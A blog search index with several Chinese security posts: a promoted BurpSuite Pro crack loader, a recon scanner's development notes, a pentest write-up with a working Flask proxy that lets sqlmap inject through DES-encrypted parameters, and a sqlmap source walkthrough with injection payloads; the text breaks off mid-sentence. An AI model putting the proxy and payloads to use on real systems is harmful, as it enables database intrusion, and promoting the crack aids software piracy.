<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>BurpSuitePro 2.1及之后版本通杀加载器</title>
    <url>/archives/c5863b38.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>直接看图。</p><p><img src="https://i.loli.net/2020/03/28/UQFCOg8EhKqejGo.gif" alt="BpLoad"></p><a id="more"></a><!-- rebuild by neat -->]]></content>
      <categories>
        <category>工具环境</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>AWIScan编写之路</title>
    <url>/archives/84cd09d9.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>红队评估、渗透测试等安全工作最为重要的就是信息收集，信息收集工作需要对目标多方面、多维度进行收集、梳理。相信大家也用过许多信息收集的工具，例如：nmap、msscan、subdomainBrute、whatweb、dirscan、dirsearch、wydomain等等。当对一个目标群体（多ip段 or 多域名）进行信息收集时，往往需要不断在各个工具之间来回切换。通过寻找发现了一款工具：<a href="https://github.com/TideSec/FuzzScanner" target="_blank" rel="noopener">FuzzScaner</a>，该工具整合了子域名、端口、指纹、c段等信息收集。但FuzzScaner存在几点问题：1.长期不维护&amp;更新，上次提交为2019.04；2.使用python2，python2马上不被官方支持；3.只做了简单整合，多工具调度之间容易出问题。因此，自己动手造了一个轮子：<a href="https://github.com/HyWell/AWIScan" target="_blank" rel="noopener">AWIScan</a>——All Web Info Scan。</p><p><img src="https://i.loli.net/2019/10/23/lLGJKfo2j1Wdvyk.png" alt="AWIScan.png"></p><a id="more"></a><h1 id="功能构思"><a href="#功能构思" class="headerlink" title="功能构思"></a>功能构思</h1><p>根据上面所述，新开发的工具需要具备如下特性：</p><ul><li>尽可能快的完成任务</li><li>尽可能多的收集信息</li><li>尽可能少的参数输入</li><li>最好支持插件或模块拓展</li></ul><p>根据上述特性，采用了</p><ul><li>Python3 asyncio协程</li><li>支持端口扫描（调用nmap）、子域名爆破、目录爆破</li><li>总共三个参数，可直接使用单个参数即可执行 任务，其中level参数可不输入，默认为1</li><li>需要修改的配置信息都在setting.py文件中</li></ul><h1 id="框架流程"><a href="#框架流程" class="headerlink" title="框架流程"></a>框架流程</h1><p>这里借鉴了许多项目：SQLMap、PocSuite3、subdomainBrute、Dirscmap、Dirsearch、FuzzScaner等等。最终结构如下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── AWIScan.py</span><br><span class="line">├── README.md</span><br><span class="line">├── data</span><br><span class="line">│   ├── subDomain</span><br><span class="line">│   │   ├── dns_server.txt</span><br><span class="line">│   │   ├── next_sub_full.txt</span><br><span class="line">│   │   └── subnames_full.txt</span><br><span class="line">│   └── webScan</span><br><span class="line">│       ├── dict.txt</span><br><span class="line">│       └── user-agents.txt</span><br><span class="line">├── lib</span><br><span class="line">│   ├── __init__.py</span><br><span class="line">│   ├── controller</span><br><span class="line">│   │   ├── aiodirscan.py</span><br><span class="line">│   │   ├── aionmap.py</span><br><span class="line">│   │   ├── aioportscan.py</span><br><span class="line">│   │   ├── aiosubdomainscan.py</span><br><span class="line">│   │   └── engine.py</span><br><span class="line">│   ├── core</span><br><span class="line">│   │   ├── common.py</span><br><span class="line">│   │   ├── convert.py</span><br><span class="line">│   │   ├── data.py</span><br><span class="line">│   │   ├── datatype.py</span><br><span class="line">│   │   ├── enums.py</span><br><span class="line">│   │   ├── log.py</span><br><span class="line">│   │   ├── options.py</span><br><span class="line">│   │   └── setting.py</span><br><span class="line">│   ├── parse</span><br><span class="line">│   │   ├── cmdline.py</span><br><span class="line">│   │   ├── ip.py</span><br><span class="line">│   │   ├── result.py</span><br><span class="line">│   │   └── url.py</span><br><span class="line">│   └── thirdparty</span><br><span class="line">│       ├── __init__.py</span><br><span class="line">│       ├── ansistrm</span><br><span class="line">│       │   ├── __init__.py</span><br><span class="line">│       │   └── ansistrm.py</span><br><span class="line">│       ├── colorama</span><br><span class="line">│       │   ├── __init__.py</span><br><span class="line">│       │   ├── ansi.py</span><br><span class="line">│       │   ├── ansitowin32.py</span><br><span class="line">│       │   ├── initialise.py</span><br><span class="line">│       │   ├── win32.py</span><br><span class="line">│       │   └── winterm.py</span><br><span class="line">│       └── termcolor</span><br><span class="line">│           └── termcolor.py</span><br><span class="line">├── output</span><br><span class="line">│   ├── AWIScan</span><br><span class="line">│   │   └── bad_dns_servers.txt</span><br><span class="line">│   └── result</span><br><span class="line">└── requirement.txt</span><br></pre></td></tr></table></figure><p>流程为：参数解析——配置注册——任务分配——开始工作——输出结果。</p><h1 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h1><p>初始目标支持以下几种格式：</p><ul><li>192.168.1.1</li><li>192.168.1.1/24</li><li>192.168.1.1-192.168.1.100</li><li>192.168.1.1-254</li><li>domain.com</li><li>[http/https]://domain.com</li></ul><p><del>现版本根据不同的输入目标会执行相应的功能：</del></p><ul><li><del>纯ip地址执行端口扫描，e x 192.168.1.1…</del></li><li><del>域名会执行子域名爆破，e x domain.com</del></li><li><del>url会执行目录扫描，e x <a href="http://domain.com" target="_blank" rel="noopener">http://domain.com</a> or <a href="https://domain.com" target="_blank" rel="noopener">https://domain.com</a></del></li></ul><p>所有初始目标都会执行端口扫描，如果没有协议会再执行子域名爆破、如果还有协议会再加上目录扫描。</p><p><del>该版本只在OSX、python3.7下测试过，别的系统版本可以自己试试（估计问题不大）。</del></p><p>Windows（10）、linux（Debian）、MacOS（10.15） &amp;&amp; python3.7皆测试通过。</p><p>由于端口扫描是调用nmap的，本地机器需要安装nmap，并且执行脚本需要有对应权限，可在lib/core/setting.py中配置SUDO_PASSWORD。具体端口扫描速度并未进行测试。</p><p>由于端口扫描是调用nmap的，本地机器需要安装nmap，并且执行脚本需要有对应权限，可在lib/core/setting.py中配置SUDO_PASSWORD。具体端口扫描速度并未进行测试。</p><p>子域名爆破需要指定对应DNS服务器，整体速度子域名爆破一千三百多个，最快一次是三十多秒（估计有dns缓存的原因）。清理缓存，再次测试七分钟左右（协程数50）。</p><p>目录扫描由于设计到网络、防护等关系，未进行测试。</p><h1 id="问题难点"><a href="#问题难点" class="headerlink" title="问题难点"></a>问题难点</h1><p>在编写的时候遇到种种问题和难点：</p><ul><li>协程库的资料相对较少</li><li>许多库在调用中会出现千奇百怪的问题</li><li>慢速生产、快速消费模型，如何保持消费者数不减少</li></ul><p>针对第三个模型做一下记录：下面代码有可能导致最后只有一个协程在工作，但任务队列中还具备无数任务</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(target_queue, html)</span>:</span></span><br><span class="line">  urls = <span class="keyword">await</span> asyncio.sleep(<span class="string">"5"</span>) <span class="comment"># 用来模拟页面解析</span></span><br><span class="line">  <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">    target_queue.put_notwait(url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">work</span><span class="params">(url)</span>:</span></span><br><span class="line">  resp = <span class="keyword">await</span> asyncio.sleep(<span class="string">"5"</span>) <span class="comment"># 用来模拟网络请求</span></span><br><span class="line">  <span class="keyword">if</span> resp.status == <span class="number">200</span>:</span><br><span class="line">    <span class="keyword">return</span> resp.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(target_queue)</span>:</span></span><br><span class="line">  <span class="keyword">while</span> target_queue.qsize() &gt; <span class="number">0</span>:</span><br><span class="line">    target = target_queue.get_nowait()</span><br><span class="line">    html = work(target)</span><br><span class="line">    result = <span class="keyword">await</span> parse(target_queue, html)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">control</span><span class="params">(base_url)</span>:</span></span><br><span class="line">  tasks = []</span><br><span class="line">	target_queue = asyncio.Queue()</span><br><span class="line">  base_urls = <span class="keyword">await</span> asyncio.sleep(<span class="string">"5"</span>) <span class="comment"># 用来模拟初始url解析</span></span><br><span class="line">  <span class="keyword">for</span> url <span class="keyword">in</span> base_urls:</span><br><span class="line">    target_queue.put_notwait(url)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">50</span>):</span><br><span class="line">    tasks.append(asyncio.create_task(scan(target_queue)))</span><br><span class="line">  <span class="keyword">await</span> asyncio.gather(*tasks)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">asyncio.run(contronl(base_url))</span><br></pre></td></tr></table></figure><p>后面在主协程中同归队列进行阻塞，子协程阻塞至任务获取，即可解决该问题。即所有子协程都不断运行，直至取不到任务时阻塞。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(target_queue, html)</span>:</span></span><br><span class="line">  urls = <span class="keyword">await</span> asyncio.sleep(<span class="string">"5"</span>) <span class="comment"># 用来模拟页面解析</span></span><br><span class="line">  <span class="keyword">if</span> urls:</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">      target_queue.put_notwait(url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">work</span><span class="params">(url)</span>:</span></span><br><span class="line">  resp = <span class="keyword">await</span> asyncio.sleep(<span class="string">"5"</span>) <span class="comment"># 用来模拟网络请求</span></span><br><span class="line">  <span class="keyword">if</span> resp.status == <span class="number">200</span>:</span><br><span class="line">    <span class="keyword">return</span> resp.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(target_queue)</span>:</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">await</span> target_queue.get()</span><br><span class="line">    target = target_queue.get_nowait()</span><br><span class="line">    html = work(target)</span><br><span class="line">    result = <span class="keyword">await</span> parse(target_queue, html)</span><br><span class="line">    target_queue.task_done()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">control</span><span class="params">(base_url)</span>:</span></span><br><span class="line">  tasks = []</span><br><span class="line">	target_queue = asyncio.Queue()</span><br><span class="line">  base_urls = <span class="keyword">await</span> asyncio.sleep(<span class="string">"5"</span>) <span class="comment"># 用来模拟初始url解析</span></span><br><span class="line">  <span class="keyword">for</span> url <span class="keyword">in</span> base_urls:</span><br><span class="line">    target_queue.put_notwait(url)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">50</span>):</span><br><span class="line">    tasks.append(asyncio.create_task(scan(target_queue)))</span><br><span class="line">  <span class="keyword">await</span> target_queue.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">asyncio.run(contronl(base_url))</span><br></pre></td></tr></table></figure><p>下面再记录一下小问题</p><ul><li><p>通过asyncio.queue设置队列最好在对应协程函数中建立：一开始将工作队列设置成全局，然后在各个文件进行加载，该方式会导致异常，大概含义是一个loop只能使用同一个队列。</p></li><li><p>由于协程概念，所以最好只使用一个loop：在进行dns服务器测试的时候通过get_event_loop建立了新的loop之后（完成任务之后loop.close），在后续再次通过get_event_loop是无法成功新建协程的：RuntimeError: Event loop is closed。可通过set_even_loop解决，但不建议。</p></li></ul><ul><li>异步DNS库还不够完善，在aiodns、async_dns、aiodnsresolver中来来回回切换，最后选择了aiodns。<ul><li>aiodns未看到timeout参数，所以子域名爆破有可能超时导致速度不稳定</li><li>async_dns在DNS服务器测试完成之后，再此调用返回的结果为空，估计是由于不同loop的原因导致？</li><li>aiodnsresolver在进行dns服务器配置感觉不太好用，所以弃用。</li></ul></li></ul><h1 id="后续计划更新"><a href="#后续计划更新" class="headerlink" title="后续计划更新"></a>后续计划更新</h1><ul><li><input checked disabled type="checkbox"> 目录爆破支持随机User-Agent</li><li><input checked disabled type="checkbox"> 目录爆破支持代理</li><li><input disabled type="checkbox"> 整合目标，将ip、domain这些统一整合</li><li><input disabled type="checkbox"> 支持多进程扫描</li><li><input disabled type="checkbox"> 支持自定义插件扫描</li><li><input disabled type="checkbox"> 强化扫描能力</li><li><input disabled type="checkbox"> 。。。</li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>感谢GitHub上这么多开源的工具</li><li>写代码好难～～～</li><li>在遇到问题查看官方文档如果无法解决，可以直接看对应源码</li><li>AWIScan项目应该有很多面条式代码，后续看看能不能逐渐优化</li><li>对变量进行命令真的太难了，所以很多地方用了同样的变量名。全局变量设置成全大写，局部变量是全小写，不同参数传递参数前面变量名相同（尽量）</li></ol><!-- rebuild by neat -->]]></content>
      <categories>
        <category>工具环境</category>
      </categories>
      <tags>
        <tag>AWIScan</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试-响应加密SQL注入</title>
    <url>/archives/8592a171.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>在渗透的时候，发现有一处注入点请求参数进行了des加密，并且响应包也通过des进行了加密。想使用sqlmap进行注入，发现sqlmap不支持响应包处理操作（tamper只适用于请求包处理）。通过flask进行处理，最终使用sqlmap成功注入。</p><p><img src="https://i.loli.net/2019/07/11/5d26a759ad31f57825.png" alt="sqlmap-result.png"></p><a id="more"></a><h1 id="寻找注入点"><a href="#寻找注入点" class="headerlink" title="寻找注入点"></a>寻找注入点</h1><p>发现一处页面名称为doQuery，猜测是用来执行查询功能。POST请求包：其参数名为reqParam，其值为des加密字段（url编码）。</p><p><img src="https://i.loli.net/2019/07/11/5d2693a89620e87249.png" alt="request.png"></p><p>经过验证确实为des加密，如何寻找key、iv在此就不赘述了，可以去<a href="/archives/5f6b1580.html" title="渗透测试-加密SQL注入">渗透测试-加密SQL注入</a>了解。</p><p><img src="https://i.loli.net/2019/07/11/5d2696e5a958769670.png" alt="des-req.png"></p><p>查看对应的响应包，发现整个响应包内容都被加密了</p><p><img src="https://i.loli.net/2019/07/11/5d26a8e9661dd40130.png" alt="des-resp.png"></p><p>使用对应的key能将响应包内容解密出来。</p><p><img src="https://i.loli.net/2019/07/11/5d26975c2661630066.png" alt="des-resp.png"></p><h2 id="SQLMap"><a href="#SQLMap" class="headerlink" title="SQLMap"></a>SQLMap</h2><h2 id="问题归纳"><a href="#问题归纳" class="headerlink" title="问题归纳"></a>问题归纳</h2><p>本以为SQLMap会自带功能对响应包进行解密，毕竟SQLMap支持自定义脚本（tamper）对请求包进行处理。根据sqlmap官方github仓库的<a href="https://github.com/sqlmapproject/sqlmap/issues/2309" target="_blank" rel="noopener">issues</a>，得知SQLMap不支持对响应内容进行编码处理。现在的问题点在于如何对response进行处理，认真想了想sqlmap支持proxy进行代理，那么可以通过代理将请求转发过来，由代理服务器对请求、响应进行处理。</p><h2 id="flask代理"><a href="#flask代理" class="headerlink" title="flask代理"></a>flask代理</h2><p>需要实现几个关键点：</p><ul><li>对请求参数reqParam的值进行des加密，假定该值为encrypt_str</li><li>对encrypt_str进行url编码处理，假定该值为post_data</li><li>对响应包进行解密</li></ul><p>这里就直接贴代码给大家参考参考。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pyDes</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, Response</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote, quote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proxy</span><span class="params">()</span>:</span></span><br><span class="line">    secret_key = <span class="string">b"****"</span></span><br><span class="line">    k = pyDes.des(secret_key, pyDes.ECB, pad=<span class="literal">None</span>, padmode=pyDes.PAD_PKCS5)</span><br><span class="line">    encrypt_test_str = unquote(request.get_data().decode())[<span class="number">9</span>:]</span><br><span class="line">    encrypt_str = k.encrypt(encrypt_test_str)</span><br><span class="line">    post_data = <span class="string">b'reqParam='</span> + quote(base64.b64encode(encrypt_str)).encode()</span><br><span class="line">    app.logger.info(<span class="string">"Encrypt data:%s"</span>, post_data)</span><br><span class="line">    resp = requests.request(</span><br><span class="line">        method=request.method,</span><br><span class="line">        url=request.url,</span><br><span class="line">        headers=&#123;key: value <span class="keyword">for</span> (key, value) <span class="keyword">in</span> request.headers <span class="keyword">if</span> key != <span class="string">'Host'</span>&#125;,</span><br><span class="line">        data=post_data,</span><br><span class="line">        cookies=request.cookies, allow_redirects=<span class="literal">False</span>, verify=<span class="literal">False</span>)</span><br><span class="line">    excluded_headers = [<span class="string">'content-encoding'</span>, <span class="string">'content-length'</span>, <span class="string">'transfer-encoding'</span>, <span class="string">'connection'</span>]</span><br><span class="line">    headers = [(name, value) <span class="keyword">for</span> (name, value) <span class="keyword">in</span> resp.raw.headers.items()</span><br><span class="line">               <span class="keyword">if</span> name.lower() <span class="keyword">not</span> <span class="keyword">in</span> excluded_headers]</span><br><span class="line">    response_data = base64.b64decode(resp.content)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b"false"</span> <span class="keyword">in</span> k.decrypt(response_data):</span><br><span class="line">        app.logger.error(<span class="string">'Response data:%s'</span>, k.decrypt(response_data))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        app.logger.info(<span class="string">'Response data:%s'</span>, k.decrypt(response_data))</span><br><span class="line">    response = Response(k.decrypt(response_data), resp.status_code, headers)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>将请求保存到sql.txt里，需要注意的是在sql.txt中reqParam参数需为解密之后字符串。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo python sqlmap.py -r sql.txt --proxy http://127.0.0.1:5000</span><br></pre></td></tr></table></figure><h1 id="SQL注入问题解决"><a href="#SQL注入问题解决" class="headerlink" title="SQL注入问题解决"></a>SQL注入问题解决</h1><p>现在已经可以通过flask对请求、响应进行加密、解密等操作，但是查看sqlmap的返回结果，显示没有注入。Emmmm·····认真查看了json里面参数，发现有orderBy参数，直接使用*指定该参数，看看能不能有什么进展。</p><p>这时候发现响应内容为：<code>{&quot;errmsg&quot;:&quot;ORA-01785: ORDER BY item must be the number of a SELECT-list expression\\n&quot;,&quot;success&quot;:false}&#39;</code>基本可以明确该点确实有问题，但是这次依旧跑不出来！</p><p>认真查看发现爆出了原始语句，最后对注入点的语句进行“优化”，成功跑出来。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>​ 1.有时候可以通过自己编写一些小工具辅助工作，例如本次使用flask结合sqlmap；</p><p>​ 2.在某些时候如果没有思路，对已有的信息再归纳归纳，或许有意想不到的收获，例如本次对注入点“优化”。</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLMap原理分析(二)</title>
    <url>/archives/782ab1db.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>在<a href="/archives/e409b646.html" title="SQLMap原理分析(一)">SQLMap原理分析(一)</a>通过SQLMap的请求进行了一次简单的分析，大概了解SQLMap一个粗略的运行流程。这次通过源码的Debug进行深入一点研究。</p><a id="more"></a><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>这里使用pycharm进行debug，打开SQLMap项目之后，在【Run】-【Edit Configurations】设置参数：-u <a href="http://testasp.vulnweb.com/showforum.asp?id=0" target="_blank" rel="noopener">http://testasp.vulnweb.com/showforum.asp?id=0</a> –flush-session。由于上次跑了testasp这个站点有缓存因此加上了–flush-session。</p><p><img src="https://i.loli.net/2019/05/04/5ccd2ed407c05.png" alt="pycharm-config.png"></p><h1 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h1><h2 id="连接检测"><a href="#连接检测" class="headerlink" title="连接检测"></a>连接检测</h2><p>准备工作做好之后，在sqlmapy.py文件第407行下一个断点，然后开启Debug之旅。</p><p><img src="https://i.loli.net/2019/05/04/5ccd2eec3ac6a.png" alt="debug-1.png"></p><p>可以看到现在已经成功断到407行了，单步步入到main()函数中。发现前面几行代码是获取配置、路径、banner等信息。当运行到136行的时候可以发现已经获取到前面设置的站点参数。</p><p><img src="https://i.loli.net/2019/05/04/5ccd2f556aa4b.png" alt="debug-2.png"></p><p>运行到156行步入到init()函数中，2629行至后面可以看到会进行一系列设置：http、threads等等。</p><p><img src="https://i.loli.net/2019/05/04/5ccd2eecea60d.png" alt="debug-3.png"></p><p>步出回到sqlmapy.py中的main函数，继续单步运行会进行一系列判断检查，直到177行会发现start函数，步入到start函数。这时候会来到./lib/core/decorators.py的stackedmethod函数，根据注释，该函数是用来堆栈对齐的回退函数（不太理解啥意思）。看到result关键字直接步入。</p><p><img src="https://i.loli.net/2019/05/04/5ccd2f54bbdba.png" alt="debug-4.png"></p><p>发现来到./lib/controller/controller.py的start函数。根据注释可以得知，该函数用来检查url、请求方式、cookie以及是否存在注入等。</p><p><img src="https://i.loli.net/2019/05/04/5ccd2eeb99d73.png" alt="debug-5.png"></p><p>经过一系列的信息获取：Method、paramKey、Headers等，来到了420行进行连接等检查。</p><p><img src="https://i.loli.net/2019/05/04/5ccd2eecc3af6.png" alt="debug-6.png"></p><p>跟进checkConnection函数，会来到./controller/checks.py。先检查hostname是否是ip形式（xxx.xxx.xxx.xxx），之后检查有没有设置代理。然后输出log信息：尝试连接目标url。</p><p><img src="https://i.loli.net/2019/05/04/5ccd2eed053b4.png" alt="debug-7.png"></p><p>终端上这时候print出该条日志信息。</p><p><img src="https://i.loli.net/2019/05/04/5ccd2eecea051.png" alt="log-print.png"></p><p>在1589行可以看到开始进行request请求，跟进Request函数，来到./request/connect.py，通过注释可以得知queryPage函数是用来获取目标url页面内容。</p><p><img src="https://i.loli.net/2019/05/04/5ccd2eec3b6ea.png" alt="debug-8.png"></p><p>直到1306行调用Connect.getPage发起请求开始获取页面内容。</p><p><img src="https://i.loli.net/2019/05/04/5ccd2eed06b5e.png" alt="debug-9.png"></p><p>步入getPage函数，经过一系列的赋值：url、get类型参数、cookie等。</p><p><img src="https://i.loli.net/2019/05/04/5ccd2f5605d4b.png" alt="debug-10.png"></p><p>497行调用urllib.request.urlopent发起请求。</p><p><img src="https://i.loli.net/2019/05/04/5ccd2f55cf740.png" alt="debug-11.png"></p><p>515行获取响应正文信息，这跟上篇文章请求第一个请求包相呼应。</p><p><img src="https://i.loli.net/2019/05/04/5ccd2f561842f.png" alt="debug-12.png"></p><p>570行会关闭连接。</p><p><img src="https://i.loli.net/2019/05/04/5ccd2f55d1102.png" alt="debug-13.png"></p><p>最后getPage函数会return出响应正文、响应头以及响应状态码。继续运行回到queryPage函数，经过一系列处理queryPage函数将响应正文、响应头以及响应状态码也return出去。</p><p><img src="https://i.loli.net/2019/05/04/5ccd2f55e3e92.png" alt="debug-14.png"></p><p>之后会来到./lib/core/decorators.py，会将获取到的result返回。</p><p><img src="https://i.loli.net/2019/05/04/5ccd2f555cfc4.png" alt="debug-15.png"></p><p>会回到checks.py，最终返回True。这时候SQLMap已经获知目标站点可连接。</p><p><img src="https://i.loli.net/2019/05/04/5ccd2f558f816.png" alt="debug-16.png"></p><h2 id="WAF判断"><a href="#WAF判断" class="headerlink" title="WAF判断"></a>WAF判断</h2><p>之后会开始进行WAF检测&amp;识别。</p><h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><p>在423行进行waf检测。</p><p><img src="https://i.loli.net/2019/05/04/5ccd2f5583e99.png" alt="debug-17.png"></p><p>跟进checkWaf函数，又会来到stackedmethod函数，直接到在result进行步入，会来到checkWaf函数。根据注释可以得知sqlmap的waf检测能力来源nmap的http-waf-detect脚本。</p><p><img src="https://i.loli.net/2019/05/04/5ccd307501870.png" alt="debug-18.png"></p><p>首先将几种攻击类型的payload（SQL注入、目录遍历、XSS等）拼接到已有参数发起请求。</p><p><img src="https://i.loli.net/2019/05/04/5ccd3075e0add.png" alt="debug-19.png"></p><p>如果直接连接错误，可以判断存在WAF。若可正常连接，判断不存在WAF。</p><p><img src="https://i.loli.net/2019/05/04/5ccd3075de50a.png" alt="debug-20.png"></p><h3 id="识别"><a href="#识别" class="headerlink" title="识别"></a>识别</h3><p>继续执行可以看到identifyWaf函数，但由于并未设置检测waf会被判断跳过。可以按住command点击identifyWaf函数跟进查看原理。大概原理是调用waf文件夹下脚本进行检测-得到结果。脚本脚本大概逻辑为：发起请求-获取响应正文、响应头、响应码-根据规则判断-返回结果。</p><p><img src="https://i.loli.net/2019/05/04/5ccd3075ce2c5.png" alt="debug-21.png"></p><h2 id="稳定性检测"><a href="#稳定性检测" class="headerlink" title="稳定性检测"></a>稳定性检测</h2><p>回到controller运行至436行会有checkStability函数。</p><p><img src="https://i.loli.net/2019/05/04/5ccd3074bd00b.png" alt="debug-22.png"></p><p>跟进该函数，通过备注发现该函数是用来进行稳定性检测。</p><p><img src="https://i.loli.net/2019/05/04/5ccd3075dfc04.png" alt="debug-23.png"></p><h2 id="参数动态检测"><a href="#参数动态检测" class="headerlink" title="参数动态检测"></a>参数动态检测</h2><p>经过一系列赋值&amp;判断，运行至535行步入checkDynParam函数，根据注释可以得知该函数是用来检测参数是否为动态。</p><p><img src="https://i.loli.net/2019/05/04/5ccd3075cc469.png" alt="debug-24.png"></p><h2 id="注入检测"><a href="#注入检测" class="headerlink" title="注入检测"></a>注入检测</h2><h3 id="简单判断"><a href="#简单判断" class="headerlink" title="简单判断"></a>简单判断</h3><p>运行至558行，终于来到关键的注入检测。跟进heuristicCheckSqlInjection函数，在1023行进行随机字符串获取，随机字符串长度为10。并且该随机字符串需满足单引号或者双引号出现次数为1。</p><p><img src="https://i.loli.net/2019/05/04/5ccd3075db5a4.png" alt="debug-25.png"></p><p>接下来将随机字符串拼接成payload，发起请求。这个请求跟上篇文章请求中的注入判断请求包对应。</p><p><img src="https://i.loli.net/2019/05/04/5ccd3075cb1c8.png" alt="debug-26.png"></p><p>1035行调用parseFilePaths函数检测响应正文中是否包含绝对路径。</p><p><img src="https://i.loli.net/2019/05/04/5ccd3075a7b0a.png" alt="debug-27.png"></p><p>1036行检测上一个响应是否有数据库错误信息，这时候的上个请求payload是包含单双引号的，通过这种方式可以极快的判断是否存在注入。</p><p><img src="https://i.loli.net/2019/05/04/5ccd30c3e1ed1.png" alt="debug-28.png"></p><p>由于这里并不会有数据库的报错信息，所以还需要继续运行。在1092行会生成两个随机变量，长度为6。接下来生成带&lt;’&quot;&gt;的payload，该payload为第一个随机字符串加上&lt;’&quot;&gt;加上第二个随机字符串。</p><p><img src="https://i.loli.net/2019/05/04/5ccd30c433f5d.png" alt="debug-29.png"></p><p>1095行出现agent.payload函数，跟进该函数（./lib/core/agent.py），根据注释得知该函数功能是替换SQL注入参数。</p><p><img src="https://i.loli.net/2019/05/04/5ccd30c3b927a.png" alt="debug-30.png"></p><p>166行调用cleanupPayload函数，根据函数名猜测该函数主要是用来进行payload清理。</p><p><img src="https://i.loli.net/2019/05/04/5ccd30c3e2e76.png" alt="debug-31.png"></p><p>最终返回经过处理之后的payload:<br><code>u&#39;id=__PAYLOAD_DELIMITER__0\&#39;ozeyed&lt;\&#39;&quot;&gt;cOuFpj__PAYLOAD_DELIMITER__&#39;</code>。</p><p><img src="https://i.loli.net/2019/05/04/5ccd30c463356.png" alt="debug-32.png"></p><p>之后使用处理之后的payload发起请求。</p><p><img src="https://i.loli.net/2019/05/04/5ccd30c486dcd.png" alt="debug-33.png"></p><p>最后返回kb.heuristicTest。</p><p><img src="https://i.loli.net/2019/05/04/5ccd30c458928.png" alt="debug-34.png"></p><p>继续运行回到start函数，570行调用checkSqlInjection开始进行注入检测。</p><p><img src="https://i.loli.net/2019/05/04/5ccd30c3e0fdc.png" alt="debug-35.png"></p><p>跟进checkSqlInjection函数，调用InjectionDict函数设置注入字典，之后对参数值类型进行检查。</p><p><img src="https://i.loli.net/2019/05/04/5ccd30c3e00ac.png" alt="debug-36.png"></p><p>135行调用getSortedInjectionTests函数获取待注入类型及其payload等信息。142行会将tests数据取出来，直至取完才能跳出141行的while循环。</p><p><img src="https://i.loli.net/2019/05/04/5ccd30c466091.png" alt="debug-37.png"></p><p>148行由于条件并不满足，会跳过dbms检测。</p><p><img src="https://i.loli.net/2019/05/04/5ccd3101f21d1.png" alt="debug-38.png"></p><p>之后对payload进行处理，直至506、511行调用Request.queryPage请求。这时候的payload包含AND关键字。</p><p><img src="https://i.loli.net/2019/05/04/5ccd311092e00.png" alt="debug-39.png"></p><p>之后对结果进行判断，由于并没有满足条件，许多判断都直接pass掉。开始重新构造payload发起请求。直至payload为boolen类型注入，会进入判断设置injectable = 